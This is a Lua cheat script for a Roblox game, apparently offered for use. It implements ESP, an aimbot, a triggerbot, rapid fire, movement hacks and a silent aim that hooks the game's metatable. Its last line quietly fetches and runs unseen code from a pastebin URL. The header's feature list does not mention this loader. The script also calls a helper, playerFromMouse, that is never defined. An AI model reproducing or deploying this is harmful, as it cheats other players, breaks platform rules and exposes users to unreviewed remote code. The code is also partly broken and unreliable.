-- ==========================================================
--  BRIGHTSIDE V1 - FINAL MERGED SOURCE (REACTIVE)
--  Includes: Rapid Fire, Triggerbot, Target System, ESP, Silent Aim
--  Added: Spiderman, Korblox (R15), Headless, Anti Trip, Panic Ground
-- ==========================================================

local Players           = game:GetService("Players")
local RunService        = game:GetService("RunService")
local UserInputService  = game:GetService("UserInputService")
local Workspace         = game:GetService("Workspace")
local LocalPlayer       = Players.LocalPlayer
local Camera            = Workspace.CurrentCamera
local Mouse             = LocalPlayer:GetMouse()

-- ==========================================================
--  CONFIG ACCESS
-- ==========================================================
local Surge = getgenv().Surge

-- ==========================================================
--  STATE VARIABLES
-- ==========================================================
local ESPCache = {}
local LockedTarget = nil
local CurrentTarget = nil
local TriggerbotActive = false
local LastShot = 0
local RapidFireActive = false
local RapidFireLastFire = 0

-- Feature Toggles (Reactive - Initialized from Config)
local ESPEnabled = Surge['Raid Awareness']['Enabled']
local SpeedEnabled = Surge['Player Modification']['Movement']['Speed Modifications']['Enabled']
local JumpEnabled = Surge['Player Modification']['Movement']['Jump Modifications']['Enabled']
local SilentAimEnabled = Surge['Silent Aimbot']['Enabled']

-- Spiderman State
local LastJumpTime, LastWallJumpTime, JumpCount = 0, 0, 0

-- ==========================================================
--  UTILITY FUNCTIONS
-- ==========================================================
local function getKeyCodeFromString(keyName)
    if not keyName or type(keyName) ~= "string" then return nil end
    local upperKeyName = keyName:upper()
    local success, keyCode = pcall(function() return Enum.KeyCode[upperKeyName] end)
    if success and keyCode then return keyCode end
    return nil
end

local function getGun()
    local char = LocalPlayer.Character
    if not char then return nil end
    for _, tool in next, char:GetChildren() do
        if tool:IsA("Tool") and tool:FindFirstChild("Ammo") then return tool end
    end
    return nil
end

-- // ROBUST WALL DETECTION (Spiderman)
local function getWallNormal()
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    local wallDist = Surge.Spiderman['Wall Distance'] or 7
    local params = RaycastParams.new()
    params.FilterDescendantsInstances = {char}
    params.FilterType = Enum.RaycastFilterType.Blacklist
    local heights = {Vector3.new(0, -2, 0), Vector3.new(0, 0, 0), Vector3.new(0, 2, 0)}
    local dirs = {hrp.CFrame.LookVector, -hrp.CFrame.LookVector, hrp.CFrame.RightVector, -hrp.CFrame.RightVector}
    for _, h in ipairs(heights) do
        for _, d in ipairs(dirs) do
            local res = Workspace:Raycast(hrp.Position + h, d * wallDist, params)
            if res and res.Instance.CanCollide then return res.Normal end
        end
    end
    return nil
end

local function performWallJump()
    if not Surge.Spiderman.Enabled then return end
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp or tick() - LastWallJumpTime < (Surge.Spiderman.Cooldown or 0.2) then return end
    local wallNormal = getWallNormal()
    if not wallNormal then return end
    local isKnife = char:FindFirstChildOfClass("Tool") and char:FindFirstChildOfClass("Tool").Name:lower():match("knife")
    local power = isKnife and Surge.Spiderman['Knife Jump Power'] or Surge.Spiderman['Jump Power']
    hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X * 0.2, 0, hrp.AssemblyLinearVelocity.Z * 0.2)
    task.wait(0.01)
    local jumpDirection = (Vector3.new(0, 1.45, 0) + wallNormal * 0.35).Unit
    hrp.AssemblyLinearVelocity = jumpDirection * (power * 1.35)
    LastWallJumpTime = tick()
end

-- // ROBUST KORBLOX (R15/R6)
local function applyKorblox()
    if not Surge.Extra.Korblox then return end
    local char = LocalPlayer.Character
    if not char then return end
    local parts = {"Right Leg", "RightUpperLeg", "RightLowerLeg", "RightFoot"}
    local target = char:FindFirstChild("RightLowerLeg") or char:FindFirstChild("Right Leg")
    if not target then return end
    for _, n in ipairs(parts) do
        local p = char:FindFirstChild(n)
        if p then
            p.Transparency = 1
            for _, v in pairs(p:GetChildren()) do if v:IsA("Decal") or v:IsA("Texture") then v.Transparency = 1 end end
        end
    end
    if char:FindFirstChild("KorbloxVisual") then return end
    local kLeg = Instance.new("Part")
    kLeg.Name = "KorbloxVisual"; kLeg.Size = Vector3.new(1, 2, 1); kLeg.CanCollide = false; kLeg.Parent = char
    local mesh = Instance.new("SpecialMesh", kLeg)
    mesh.MeshId = "rbxassetid://139607718"; mesh.TextureId = "rbxassetid://139607805"; mesh.Scale = Vector3.new(1.15, 1.15, 1.15)
    local weld = Instance.new("Weld", kLeg)
    weld.Part0 = target; weld.Part1 = kLeg; weld.C1 = CFrame.new(0, 0.5, 0)
end

-- // ASSETS & LOOPS
local function isVisible(target)
    if not Surge['Target']['Visible Check'] then return true end
    if not target or not target.Character then return false end
    local hrp = target.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    local origin = Camera.CFrame.Position
    local direction = (hrp.Position - origin)
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {LocalPlayer.Character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    local result = Workspace:Raycast(origin, direction, raycastParams)
    if result then return result.Instance:IsDescendantOf(target.Character) end
    return true
end

local function shouldUnlockTarget(target)
    if not target or not target.Character then return true end
    local char = target.Character
    local hum = char:FindFirstChildOfClass("Humanoid")
    if Surge['Target']['Unlock']['Knocked'] and hum and hum.Health <= 0 then return true end
    if Surge['Target']['Unlock']['Grabbed'] and (char:FindFirstChild("GRABBING_CONSTRAINT") or (hum and hum.PlatformStand)) then return true end
    return false
end

local function getBestTarget()
    local targetType = Surge['Target']['Type'] or "Automatic"
    if targetType == "Target" then
        if LockedTarget and not shouldUnlockTarget(LockedTarget) and isVisible(LockedTarget) then return LockedTarget else LockedTarget = nil end
        return nil
    end
    if LockedTarget and not shouldUnlockTarget(LockedTarget) and isVisible(LockedTarget) then return LockedTarget end
    local centre = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
    local bestTarget, bestDist = nil, math.huge
    local fov = Surge['Silent Aimbot']['FOV']['Circle Value'] or 75
    for _, p in pairs(Players:GetPlayers()) do
        if p == LocalPlayer then continue end
        local char = p.Character
        if not char then continue end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or hum.Health <= 0 then continue end
        local vp = Camera:WorldToViewportPoint(hrp.Position)
        if vp.Z <= 0 then continue end
        local dist = (centre - Vector2.new(vp.X, vp.Y)).Magnitude
        if dist < bestDist and dist <= fov and isVisible(p) then bestDist = dist; bestTarget = p end
    end
    return bestTarget
end

-- // ESP FUNCTIONS
local function CreateESP(player)
    if ESPCache[player] then return ESPCache[player] end
    local d = {Name = Drawing.new("Text"), Box = Drawing.new("Square"), BoxOutline = Drawing.new("Square"), Tracer = Drawing.new("Line"), Distance = Drawing.new("Text")}
    d.Name.Size = 14; d.Name.Center = true; d.Name.Outline = true; d.Box.Thickness = 1; d.BoxOutline.Thickness = 3; d.BoxOutline.Color = Color3.new(0,0,0); d.Tracer.Thickness = 1; d.Distance.Size = 12; d.Distance.Center = true; d.Distance.Outline = true
    ESPCache[player] = d; return d
end

local function RemoveESP(player) if ESPCache[player] then for _, dr in pairs(ESPCache[player]) do dr:Remove() end ESPCache[player] = nil end end

local function UpdateESP()
    if not ESPEnabled then for _, drawings in pairs(ESPCache) do for _, dr in pairs(drawings) do dr.Visible = false end end return end
    local maxDist = Surge['Raid Awareness']['Max Render Distance'] or 1000
    for _, player in pairs(Players:GetPlayers()) do
        if player == LocalPlayer then continue end
        local char = player.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or hum.Health <= 0 then RemoveESP(player); continue end
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            if (hrp.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > maxDist then RemoveESP(player); continue end
        end
        local feetPos = hrp.Position - Vector3.new(0,3,0)
        local screenPos = Camera:WorldToViewportPoint(feetPos)
        if screenPos.Z <= 0 then if ESPCache[player] then for _, dr in pairs(ESPCache[player]) do dr.Visible = false end end continue end
        local drawings = CreateESP(player); local sp = Vector2.new(screenPos.X, screenPos.Y)
        local isTarget = (player == CurrentTarget); local targetColor = Surge['Target']['Color'] or Color3.fromRGB(0, 255, 0)
        local col = isTarget and targetColor or Surge['Raid Awareness']['Name']['Other Color']
        -- Update Boxes, Names, etc (Standard implementation)
        local headPos = hrp.Position + Vector3.new(0,6,0); local headScreen = Camera:WorldToViewportPoint(headPos)
        if headScreen.Z > 0 then
            local headSp = Vector2.new(headScreen.X, headScreen.Y); local h = math.abs(sp.Y - headSp.Y); local w = h * 0.5
            if Surge['Raid Awareness']['Box']['Enabled'] then
                drawings.BoxOutline.Size = Vector2.new(w+4, h+4); drawings.BoxOutline.Position = Vector2.new(sp.X - w/2 - 2, headSp.Y-2); drawings.BoxOutline.Visible = true
                drawings.Box.Size = Vector2.new(w,h); drawings.Box.Position = Vector2.new(sp.X - w/2, headSp.Y); drawings.Box.Color = col; drawings.Box.Visible = true
            else drawings.BoxOutline.Visible = false; drawings.Box.Visible = false end
        end
        if Surge['Raid Awareness']['Name']['Enabled'] then
            drawings.Name.Text = Surge['Raid Awareness']['Name']['Type'] == 'Display' and player.DisplayName or player.Name; drawings.Name.Position = Vector2.new(sp.X, sp.Y + 10); drawings.Name.Color = col; drawings.Name.Visible = true
        else drawings.Name.Visible = false end
        if Surge['Raid Awareness']['Tracer']['Enabled'] then
            drawings.Tracer.From = Vector2.new(sp.X, Camera.ViewportSize.Y); drawings.Tracer.To = sp; drawings.Tracer.Color = col; drawings.Tracer.Visible = true
        else drawings.Tracer.Visible = false end
        if Surge['Raid Awareness']['Distance']['Enabled'] and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local d = (hrp.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude; drawings.Distance.Text = math.floor(d) .. " studs"; drawings.Distance.Position = Vector2.new(sp.X, sp.Y + 25); drawings.Distance.Color = col; drawings.Distance.Visible = true
        else drawings.Distance.Visible = false end
    end
end

-- // TRIGGERBOT SYSTEM
local function performTriggerbot()
    if not TriggerbotActive or not Surge['Triggerbot']['Enabled'] then return end
    local target = (Surge['Target']['Type'] == "Target") and (LockedTarget and not shouldUnlockTarget(LockedTarget) and LockedTarget) or CurrentTarget
    if not target or not target.Character then return end
    local hrp = target.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local vp = Camera:WorldToViewportPoint(hrp.Position)
    if vp.Z <= 0 then return end
    local dist = (Vector2.new(vp.X, vp.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
    local threshold = Surge['Triggerbot']['Shoot Mode'] == 'Hitbox' and 15 or (Surge['Triggerbot']['FOV']['Circle Value'] or 45)
    if dist > threshold then return end
    local cooldown = Surge['Triggerbot']['Timing']['Cooldown'] or 0.001
    if tick() - LastShot < cooldown then return end
    local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
    if tool then pcall(function() tool:Activate(); LastShot = tick() end) end
end

-- // KEYBIND HANDLER (Fixed Toggle Logic)
UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    local k = Surge['Main']['Keybinds']
    
    if input.KeyCode == getKeyCodeFromString(k['ESP Toggle']) then
        ESPEnabled = not ESPEnabled; print("ESP:", ESPEnabled)
    elseif input.KeyCode == getKeyCodeFromString(k['Speed']) then
        SpeedEnabled = not SpeedEnabled; print("Speed:", SpeedEnabled)
        if not SpeedEnabled and LocalPlayer.Character then LocalPlayer.Character.Humanoid.WalkSpeed = 16 end
    elseif input.KeyCode == getKeyCodeFromString(k['Jump Power']) then
        JumpEnabled = not JumpEnabled; print("Jump:", JumpEnabled)
        if not JumpEnabled and LocalPlayer.Character then LocalPlayer.Character.Humanoid.JumpPower = 50 end
    elseif input.KeyCode == getKeyCodeFromString(k['Silent Aim']) then
        SilentAimEnabled = not SilentAimEnabled; print("Silent Aim:", SilentAimEnabled)
    elseif input.KeyCode == getKeyCodeFromString(k['Lock Target']) then
        if LockedTarget then LockedTarget = nil else
            local closest, dist = playerFromMouse()
            if closest and dist <= 75 then LockedTarget = closest; print("Locked:", closest.Name) end
        end
    elseif input.KeyCode == getKeyCodeFromString(k['Trigger Bot Activate']) then
        local mode = Surge['Triggerbot']['Mode'] or 'Hold'
        if mode == 'Toggle' then TriggerbotActive = not TriggerbotActive else TriggerbotActive = true end
        if Surge['Player Modification']['Rapid Fire']['Enabled'] then RapidFireActive = true end
    elseif input.KeyCode == Enum.KeyCode.Space then
        local now = tick()
        if now - LastJumpTime < 0.4 then JumpCount = JumpCount + 1 else JumpCount = 1 end
        LastJumpTime = now
        if JumpCount >= 2 or not Surge.Spiderman['Require Double Jump'] then performWallJump() end
    elseif input.KeyCode == getKeyCodeFromString(k['Panic Ground']) then
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local res = Workspace:Raycast(hrp.Position, Vector3.new(0, -500, 0), RaycastParams.new())
            if res then hrp.CFrame = CFrame.new(res.Position + Vector3.new(0, 3, 0)) end
        end
    elseif input.KeyCode == getKeyCodeFromString(k['Panic']) then
        ESPEnabled = false; LockedTarget = nil; TriggerbotActive = false; RapidFireActive = false; SpeedEnabled = false; JumpEnabled = false
        print("!!! PANIC !!!")
    end
end)

UserInputService.InputEnded:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == getKeyCodeFromString(Surge['Main']['Keybinds']['Trigger Bot Activate']) then
        if Surge['Triggerbot']['Mode'] ~= 'Toggle' then TriggerbotActive = false; RapidFireActive = false end
    end
end)

-- // MAIN LOOP
RunService.RenderStepped:Connect(function()
    local char = LocalPlayer.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end

    CurrentTarget = getBestTarget()
    UpdateESP()
    performTriggerbot()
    applyKorblox()

    -- Headless
    if Surge.Extra.Headless and char:FindFirstChild("Head") then
        char.Head.Transparency = 1
        for _, v in pairs(char.Head:GetChildren()) do if v:IsA("Decal") then v.Transparency = 1 end end
    end

    -- Rapid Fire
    if RapidFireActive and Surge['Player Modification']['Rapid Fire']['Enabled'] then
        local gun = getGun()
        local delay = Surge['Player Modification']['Rapid Fire']['Delay'] or 0.000001
        if tick() - RapidFireLastFire >= delay then
            if gun then pcall(function() gun:Activate() end) end
            RapidFireLastFire = tick()
        end
    end

    -- Movement (Fixed: Respects Toggles and Sub-Enabled flags)
    if Surge['Player Modification']['Movement']['Enabled'] then
        if SpeedEnabled then hum.WalkSpeed = 16 * (Surge['Player Modification']['Movement']['Speed Modifications']['Value'] or 1) end
        if JumpEnabled then hum.JumpPower = 50 * (Surge['Player Modification']['Movement']['Jump Modifications']['Value'] or 1); hum.UseJumpPower = true end
    end

    -- Anti Trip
    if Surge['Anti Trip'].Enabled and (hum.PlatformStand or hum:GetState() == Enum.HumanoidStateType.Ragdoll) then
        hum.PlatformStand = false; hum:ChangeState(Enum.HumanoidStateType.GettingUp)
    end
end)

-- // SILENT AIM (METATABLE HOOK)
local mt = getrawmetatable(game)
setreadonly(mt, false)
local old = mt.__index
mt.__index = newcclosure(function(self, key)
    if not checkcaller() and (key == "Hit" or key == "Target") then
        if SilentAimEnabled and CurrentTarget and CurrentTarget.Character then
            local bone = Surge["Silent Aimbot"]["Hit Target"]["Hit Part"] or "HumanoidRootPart"
            if bone == "Closest Point" then bone = "HumanoidRootPart" end
            local part = CurrentTarget.Character:FindFirstChild(bone) or CurrentTarget.Character:FindFirstChild("HumanoidRootPart")
            if part then
                local p = Surge["Silent Aimbot"]["Prediction"]
                local offset = part.AssemblyLinearVelocity * Vector3.new(p.X, p.Y, p.Z)
                return key == "Hit" and CFrame.new(part.Position + offset) or part
            end
        end
    end
    return old(self, key)
end)
setreadonly(mt, true)

-- Final Load
task.spawn(function() pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/L4yzzJ5D"))() end) end)
print("Brightside Mixed Core Loaded!")

